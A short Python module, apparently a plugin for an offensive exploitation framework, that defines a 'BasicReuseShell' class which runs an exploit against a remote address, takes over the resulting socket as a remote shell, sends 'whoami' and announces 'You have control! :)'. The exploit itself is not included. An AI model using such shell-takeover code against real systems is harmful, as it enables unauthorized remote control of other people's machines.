import typing

from pytoolcore import style
from core import shellcore


class BasicReuseShell(shellcore.AsynchronousBasicRemoteShell):

    AUTHOR: str = "Danakane"

    def __init__(self) -> None:
        shellcore.AsynchronousBasicRemoteShell.__init__(self)

    def initialize(self) -> None:
        self.shellskt = self.exploit.run(self.rsockaddr)
        self.__send__("whoami")
        self.__recv__(shellcore.AsynchronousBasicRemoteShell.PDUMAXSIZE)
        print(style.Style.success("You have control! :)"))


blueprint: typing.Callable = BasicReuseShell
